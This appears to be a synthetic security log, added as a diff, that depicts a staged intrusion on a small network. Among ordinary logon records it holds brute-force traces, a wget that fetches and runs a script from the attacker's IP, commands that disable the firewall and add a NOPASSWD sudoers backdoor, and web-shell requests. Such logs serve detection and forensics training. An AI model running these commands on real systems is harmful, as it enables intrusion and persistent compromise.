@@ -1,0 +1,647 @@
+2025-06-10 08:00:00,192.168.1.100,DC-01,Security,4624,Logon Type 2,User: maryam,Source IP: 192.168.1.100,Process: C:\Windows\System32\winlogon.exe
+2025-06-10 08:00:01,192.168.1.110,FILE-01,Security,4624,Logon Type 2,User: reza,Source IP: 192.168.1.110,Process: C:\Windows\System32\winlogon.exe
+2025-06-10 08:00:02,192.168.1.120,PC-DEV-01,Security,4624,Logon Type 2,User: saeed,Source IP: 192.168.1.120,Process: C:\Windows\System32\winlogon.exe
+2025-06-10 08:00:03,192.168.1.130,PC-SALES-01,Security,4624,Logon Type 2,User: ali,Source IP: 192.168.1.130,Process: C:\Windows\System32\winlogon.exe
+2025-06-10 08:05:00,172.16.10.20,WEB-01,auth.log,Accepted password for deploy from 192.168.1.120 port 54321 ssh2
+2025-06-10 08:05:01,172.16.10.20,WEB-01,auth.log,Accepted password for webadmin from 192.168.1.100 port 54322 ssh2
+2025-06-10 08:05:02,172.16.10.20,WEB-01,auth.log,Accepted password for jenkins from 192.168.1.120 port 54323 ssh2
+2025-06-10 08:06:00,172.16.10.20,WEB-01,sudo,deploy : USER=root ; COMMAND=/bin/systemctl status nginx
+2025-06-10 08:06:01,172.16.10.20,WEB-01,sudo,deploy : USER=root ; COMMAND=/bin/systemctl restart nginx
+2025-06-10 08:06:02,172.16.10.20,WEB-01,sudo,deploy : USER=root ; COMMAND=/bin/nginx -t
+2025-06-10 08:06:03,172.16.10.20,WEB-01,sudo,webadmin : USER=root ; COMMAND=/bin/cat /var/log/nginx/access.log | grep 404
+2025-06-10 08:07:00,192.168.1.100,PC-MANAGER,Security,4624,Logon Type 10,User: maryam,Source IP: 192.168.1.100,Process: C:\Windows\System32\winlogon.exe
+2025-06-10 08:07:01,192.168.1.100,PC-MANAGER,Security,4672,Special Privileges,User: maryam
+2025-06-10 08:08:00,192.168.1.100,PC-MANAGER,Chrome,LOG,URL: https://tosnet.ir/wp-admin/,User: maryam
+2025-06-10 08:08:01,192.168.1.100,PC-MANAGER,Chrome,LOG,URL: https://tosnet.ir/wp-admin/post.php?post=123&action=edit,User: maryam
+2025-06-10 08:10:00,192.168.1.110,PC-ACCOUNT,Security,4624,Logon Type 3,User: reza,Source IP: 192.168.1.110,Share: \FILE-01\Accounting
+2025-06-10 08:10:01,192.168.1.110,PC-ACCOUNT,Security,5145,Network Share Access,User: reza,Share: \FILE-01\Accounting\FY2025,Source IP: 192.168.1.110
+2025-06-10 08:10:02,192.168.1.110,PC-ACCOUNT,Excel,LOG,File: invoice_2025_06.xlsx,User: reza
+2025-06-10 08:15:00,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:08:15:00 +0000] "GET /wp-admin/ HTTP/1.1" 200 5342 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 08:15:01,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:08:15:01 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 123 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 08:30:00,10.10.10.200,DC-01,Security,4625,Logon Type 3,User: Administrator,Source IP: 10.10.10.200
+2025-06-10 08:30:01,10.10.10.200,DC-01,Security,4625,Logon Type 3,User: Administrator,Source IP: 10.10.10.200
+2025-06-10 08:30:02,10.10.10.200,DC-01,Security,4625,Logon Type 3,User: Administrator,Source IP: 10.10.10.200
+2025-06-10 08:30:03,10.10.10.200,DC-01,Security,4625,Logon Type 3,User: Administrator,Source IP: 10.10.10.200
+2025-06-10 08:30:04,10.10.10.200,DC-01,Security,4625,Logon Type 3,User: Administrator,Source IP: 10.10.10.200
+2025-06-10 08:30:05,10.10.10.200,DC-01,Security,4625,Logon Type 3,User: Administrator,Source IP: 10.10.10.200
+2025-06-10 08:30:06,10.10.10.200,DC-01,Security,4625,Logon Type 3,User: Administrator,Source IP: 10.10.10.200
+2025-06-10 08:30:07,10.10.10.200,DC-01,Security,4625,Logon Type 3,User: Administrator,Source IP: 10.10.10.200
+2025-06-10 08:30:08,10.10.10.200,DC-01,Security,4625,Logon Type 3,User: Administrator,Source IP: 10.10.10.200
+2025-06-10 08:30:09,10.10.10.200,DC-01,Security,4625,Logon Type 3,User: Administrator,Source IP: 10.10.10.200
+2025-06-10 08:30:10,10.10.10.200,DC-01,Security,4625,Logon Type 3,User: Administrator,Source IP: 10.10.10.200
+2025-06-10 08:30:11,10.10.10.200,DC-01,Security,4625,Logon Type 3,User: Administrator,Source IP: 10.10.10.200
+2025-06-10 08:30:12,10.10.10.200,DC-01,Security,4625,Logon Type 3,User: Administrator,Source IP: 10.10.10.200
+2025-06-10 08:30:13,10.10.10.200,DC-01,Security,4625,Logon Type 3,User: Administrator,Source IP: 10.10.10.200
+2025-06-10 08:30:14,10.10.10.200,DC-01,Security,4625,Logon Type 3,User: Administrator,Source IP: 10.10.10.200
+2025-06-10 08:30:15,10.10.10.200,DC-01,Security,4625,Logon Type 3,User: Administrator,Source IP: 10.10.10.200
+2025-06-10 08:30:16,10.10.10.200,DC-01,Security,4625,Logon Type 3,User: Administrator,Source IP: 10.10.10.200
+2025-06-10 08:30:17,10.10.10.200,DC-01,Security,4625,Logon Type 3,User: Administrator,Source IP: 10.10.10.200
+2025-06-10 08:30:18,10.10.10.200,DC-01,Security,4625,Logon Type 3,User: Administrator,Source IP: 10.10.10.200
+2025-06-10 08:30:19,10.10.10.200,DC-01,Security,4625,Logon Type 3,User: Administrator,Source IP: 10.10.10.200
+2025-06-10 08:30:20,10.10.10.200,DC-01,Security,4625,Logon Type 3,User: Administrator,Source IP: 10.10.10.200
+2025-06-10 09:00:00,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:00:00 +0000] "GET /wp-login.php HTTP/1.1" 200 2048 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:00:01,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:00:01 +0000] "POST /wp-login.php HTTP/1.1" 200 2048 "http://tosnet.ir/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:00:02,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:00:02 +0000] "POST /wp-login.php HTTP/1.1" 200 2048 "http://tosnet.ir/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:00:03,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:00:03 +0000] "POST /wp-login.php HTTP/1.1" 200 2048 "http://tosnet.ir/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:00:04,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:00:04 +0000] "POST /wp-login.php HTTP/1.1" 200 2048 "http://tosnet.ir/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:00:05,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:00:05 +0000] "POST /wp-login.php HTTP/1.1" 200 2048 "http://tosnet.ir/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:00:06,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:00:06 +0000] "POST /wp-login.php HTTP/1.1" 200 2048 "http://tosnet.ir/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:00:07,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:00:07 +0000] "POST /wp-login.php HTTP/1.1" 200 2048 "http://tosnet.ir/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:00:08,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:00:08 +0000] "POST /wp-login.php HTTP/1.1" 200 2048 "http://tosnet.ir/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:00:09,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:00:09 +0000] "POST /wp-login.php HTTP/1.1" 200 2048 "http://tosnet.ir/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:00:10,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:00:10 +0000] "POST /wp-login.php HTTP/1.1" 200 2048 "http://tosnet.ir/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:00:11,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:00:11 +0000] "POST /wp-login.php HTTP/1.1" 200 2048 "http://tosnet.ir/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:00:12,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:00:12 +0000] "POST /wp-login.php HTTP/1.1" 200 2048 "http://tosnet.ir/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:00:13,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:00:13 +0000] "POST /wp-login.php HTTP/1.1" 200 2048 "http://tosnet.ir/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:00:14,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:00:14 +0000] "POST /wp-login.php HTTP/1.1" 200 2048 "http://tosnet.ir/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:00:15,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:00:15 +0000] "POST /wp-login.php HTTP/1.1" 200 2048 "http://tosnet.ir/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:00:16,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:00:16 +0000] "POST /wp-login.php HTTP/1.1" 200 2048 "http://tosnet.ir/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:00:17,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:00:17 +0000] "POST /wp-login.php HTTP/1.1" 200 2048 "http://tosnet.ir/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:00:18,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:00:18 +0000] "POST /wp-login.php HTTP/1.1" 200 2048 "http://tosnet.ir/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:00:19,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:00:19 +0000] "POST /wp-login.php HTTP/1.1" 200 2048 "http://tosnet.ir/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:00:20,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:00:20 +0000] "POST /wp-login.php HTTP/1.1" 200 2048 "http://tosnet.ir/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:00:21,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:00:21 +0000] "POST /wp-login.php HTTP/1.1" 200 2048 "http://tosnet.ir/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:00:22,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:00:22 +0000] "POST /wp-login.php HTTP/1.1" 200 2048 "http://tosnet.ir/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:00:23,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:00:23 +0000] "POST /wp-login.php HTTP/1.1" 200 2048 "http://tosnet.ir/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:00:24,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:00:24 +0000] "POST /wp-login.php HTTP/1.1" 200 2048 "http://tosnet.ir/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:00:25,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:00:25 +0000] "POST /wp-login.php HTTP/1.1" 200 2048 "http://tosnet.ir/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:00:26,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:00:26 +0000] "POST /wp-login.php HTTP/1.1" 200 2048 "http://tosnet.ir/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:00:27,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:00:27 +0000] "POST /wp-login.php HTTP/1.1" 200 2048 "http://tosnet.ir/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:00:28,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:00:28 +0000] "POST /wp-login.php HTTP/1.1" 200 2048 "http://tosnet.ir/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:00:29,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:00:29 +0000] "POST /wp-login.php HTTP/1.1" 200 2048 "http://tosnet.ir/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:00:30,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:00:30 +0000] "POST /wp-login.php HTTP/1.1" 200 2048 "http://tosnet.ir/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:00:31,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:00:31 +0000] "POST /wp-login.php HTTP/1.1" 200 2048 "http://tosnet.ir/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:00:32,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:00:32 +0000] "POST /wp-login.php HTTP/1.1" 200 2048 "http://tosnet.ir/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:00:33,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:00:33 +0000] "POST /wp-login.php HTTP/1.1" 200 2048 "http://tosnet.ir/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:00:34,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:00:34 +0000] "POST /wp-login.php HTTP/1.1" 200 2048 "http://tosnet.ir/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:00:35,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:00:35 +0000] "GET /wp-admin/ HTTP/1.1" 200 5342 "http://tosnet.ir/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:00:36,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:00:36 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 123 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:00:37,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:00:37 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:00:38,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:00:38 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:00:39,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:00:39 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:00:40,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:00:40 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:00:41,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:00:41 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:00:42,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:00:42 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:00:43,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:00:43 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:00:44,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:00:44 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:00:45,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:00:45 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:00:46,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:00:46 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:00:47,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:00:47 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:00:48,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:00:48 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:00:49,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:00:49 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:00:50,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:00:50 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:00:51,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:00:51 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:00:52,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:00:52 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:00:53,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:00:53 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:00:54,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:00:54 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:00:55,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:00:55 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:00:56,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:00:56 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:00:57,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:00:57 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:00:58,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:00:58 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:00:59,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:00:59 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:01:00,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:01:00 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:01:01,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:01:01 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:01:02,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:01:02 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:01:03,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:01:03 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:01:04,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:01:04 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:01:05,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:01:05 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:01:06,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:01:06 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:01:07,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:01:07 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:01:08,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:01:08 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:01:09,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:01:09 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:01:10,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:01:10 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:05:00,172.16.10.20,WEB-01,auth.log,Accepted password for www-data from 45.33.22.11 port 54324 ssh2
+2025-06-10 09:05:01,172.16.10.20,WEB-01,auth.log,pam_unix(sshd:session): session opened for user www-data by (uid=0)
+2025-06-10 09:05:05,172.16.10.20,WEB-01,sudo,www-data : USER=root ; COMMAND=/bin/bash -c "whoami && hostname && ip a"
+2025-06-10 09:05:10,172.16.10.20,WEB-01,sudo,www-data : USER=root ; COMMAND=/bin/wget http://45.33.22.11/update.sh -O /tmp/update.sh
+2025-06-10 09:05:15,172.16.10.20,WEB-01,bash,/tmp/update.sh: downloading secondary payload
+2025-06-10 09:05:20,172.16.10.20,WEB-01,sudo,www-data : USER=root ; COMMAND=/bin/bash /tmp/update.sh
+2025-06-10 09:05:25,172.16.10.20,WEB-01,sudo,www-data : USER=root ; COMMAND=/bin/systemctl stop nginx
+2025-06-10 09:05:30,172.16.10.20,WEB-01,sudo,www-data : USER=root ; COMMAND=/bin/systemctl stop ufw
+2025-06-10 09:05:35,172.16.10.20,WEB-01,sudo,www-data : USER=root ; COMMAND=/bin/chmod 777 /var/www/html -R
+2025-06-10 09:05:40,172.16.10.20,WEB-01,sudo,www-data : USER=root ; COMMAND=/bin/bash -c "echo 'www-data ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers"
+2025-06-10 09:06:00,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:06:00 +0000] "GET /wp-content/uploads/2025/06/shell.php HTTP/1.1" 200 5120 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:06:01,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:06:01 +0000] "POST /wp-content/uploads/2025/06/shell.php HTTP/1.1" 200 2048 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:06:02,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:06:02 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:06:03,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:06:03 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:06:04,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:06:04 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:06:05,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:06:05 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
